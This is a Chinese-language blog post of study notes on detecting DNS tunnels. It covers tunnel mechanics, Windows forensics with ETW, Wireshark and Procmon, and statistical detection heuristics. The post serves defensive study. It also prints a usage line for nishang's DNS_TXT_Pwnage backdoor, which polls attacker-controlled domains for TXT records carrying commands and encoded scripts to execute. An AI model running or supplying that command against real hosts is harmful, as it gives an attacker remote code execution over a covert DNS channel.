---
layout: post
title:  DNS tunnel 检测学习笔记
date: 2017-10-27
categories: 工具介绍
tags:  病毒分析
---


* content
{:toc}

## 简要介绍

关于[dns隧道检测](http://www.freebuf.com/articles/network/149328.html) 的学习笔记









## DNS 隧道检测

看了很多篇有关dns隧道网文，决定从以下几个方面来分析一下dns隧道

1. 原理总结
2. dns后门工具：nishang/DNS_TXT_Pwnage
3. 如何对dns请求取证分析：本机DNS请求->定位到进程，wireshark->查看流量包，监控单个进程行为

## 原理

原文中将dns tunnel按照外传，和交互方式的特点来分类

### dns外传方式分类两个因素

#### 有无经过本地dns服务器

通过本地dns服务器或者是直接向公共服务器8.8.8.8进行查询
	
	nslookup domain 8.8.8.8
	nslookup domain

效果差异： 在发现以后，使用本地dns服务器可以进行黑名单过滤，对查询过程进行阻止，使用公共dns服务器无法进行阻止

#### 有无构造dns包体

通过dns配置或者是直接发送dns包体进行查询

使用dnspython模块，或者python构造socket进行dns查询 

效果差异：

1. 系统dns配置，无法获取哪个程序调用了dns请求，仅能看到系统svchost.exe的dns请求
2. 构造dns包体，可以获取哪个进程进行了dns请求


### dns交互分析

1. 超长记录外传数据 通过记录外传数据  
2. 利用txt记录获取回传数据
3. A记录回包作为C&C地址



## 工具分析

先对工具进行分析，知己知彼，百战不殆

DNS_TXT_Pwnage

### 场景假设：

1. victim向目标evil_dns服务器请求为type=txt的dns服务
2. evil_dns返回，nishang的DNS_TXT_Pwnage读取txt并执行
3. 乌云文章：DNS TXT记录执行powershell 等多种方式 中均没有涉及到通过长域名将数据外传，相当于使用powershell使用dns_txt请求得到木马，再进行tcp通信 wooyun.jozxing.cc/static/drops/tips-8971.html

### 使用手册

	DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring start -commanddomain command.evi1cg.me -psstring test -psdomain xxx.evi1cg.me -Subdomains 1 -StopString stop
	-startdomain :向startdomain发送请求 ，从txt记录回复中提取字串 
	-cmdstring   如果startdomain 获取的值 与cmdstring 相同 会请求comdomain
	-commanddomain dns命令服务器，返回的txt记录，直接是命令方式：get-user
 	-psstring    如果startdomain 获取的值 与psstring 相同，会请求psdomain
	-psdomain    dns脚本服务器，返回的txt记录是脚本形式，是用Out-DnsTxt 加密后的，经过解密可直接执行
	-subdomain   脚本太大，txt记录长度限制只能在255，比如一个脚本可能被分成两个加密字串 subdomain为2，在域名解析配置为1.ps 和 2.ps psdomain配置为ps
	-stopstring 如果startdomain值与 stopstring相同则停止运行，注：脚本是一直运行并发送请求 

### 特征：

利用txt记录获取回传记录

对于是否构造dns包体暂不清楚，是否使用本地dns服务器可以先看代码

## 监控取证

windows cmd下 ipconfig /flushdns 刷新缓存， ipconfig /displaydns 查看缓存，[缓存操作](http://www.linuxfly.org/post/543/)

开启dns日志，[win7有效果](https://green-m.github.io/2017/08/21/windows-dns-log/)

### 使用etw

理论上可行，但是使用pywintrace不知道为什么没有日志输出，暂时无法实际操作

#### 监控每个端口上的DNS通信
   
收集每个端口(或DNS客户端)上DNS解析器执行的每个DNS解析。数据是从Microsoft-Windows-DNS-Client ETW跟踪获得

#### 监控Netflow(IP)流量到出站DNS端口53
从每个服务器收集出站端口53的Netflow数据。Netflow数据是来自数据包头(IP地址，域，端口，协议，字节和进程)的聚合网络元数据。数据来自Microsoft-Windows-Kernel-Network ETW跟踪

#### 监控内部DNS服务器上的DNS数据(DNSflow)
汇总和收集来自DNS网络中DNS服务器的DNS查询和响应数据。DNSflow监控。收集的一些信息是聚合查询计数，查询类型，查询和响应字节，子域名，客户端和域名服务器IP地址。数据从Microsoft-Windows-DNSServer ETW跟踪出获得

### 使用wireshark

采用过滤器DNS，可以很清晰查看本机DNS向外部发送的请求

完成wireshark->查看流量包 目标

### 使用procmon

如果使用系统调用方式nslookup可以很好查到dns请求参数

procmon 是windowSysinternals中一款工具，可以对文件，进程，注册表操作做监控，使用菜单栏->Tools->Network Summary可以查看到相关的网络请求 Path代表 ```ip:port```形式 port为domain代表是dns查询，ip很有可能是内网地址，内网ip服务器，双击(添加进入过滤器)，再使用Show ProcessTree 即可查看进程树，可以查看到调用的进程

简单易操作，能够完成从异常DNS定位到发起进程，无论是调用系统配置，nslookup，或者是构造dns查询包直接查询。

完成 本机DNS请求->定位到进程

在进程树将进程和子进程加入过滤器，可以监控所有的行为：完成  监控单个进程行为

## 大流量对DNS隧道进行检测(理论)
SAAN白皮书[检测DNS隧道](https://github[.]com/NetSPI/BurpCollaboratorDNSTunn)

文章从payload分析和流量分析两个部分来对dns流量进行检测

### payload分析

请求和响应用来做隧道指示器

借用DGA(Domain Generation Algorithms)方法，

#### 请求和响应的长度

1. 检查请求源和目标字节长度的比率
2. DNS隧道请求的字符从63到255个，也有人以52个以上做鉴别

#### 主机名的熵

合法的DNS名通常来说符合字典而且看起来有意义，不合法的域名熵值高

#### 统计分析

1. 合法的域名使用的数字少，不合法的数字多

2. 合法的域名在一定层度上反映了通用语言文本，使用字符频率来检测
3. 重复辅音和数字通常情况都不会出现，

#### 不寻常的记录类型

TXT 记录

#### 

### 流量分析

存在于时间之上，将考虑技术、频率和其他请求属性



## 攻击者角度 DNS使用

### 动态DNS 技术

将域名链接到动态IP上，IP 是变化的，动态IP地址映射到一个固定的域名解析服务上

### Fast-flux


IP频繁变化 对应一个域名
(fast-flux技术地址)[http://www.freebuf.com/articles/network/136423.html]

### 域名地址变化

固定时间间隔产生唯一的域名， 域名生成算法(DGA)


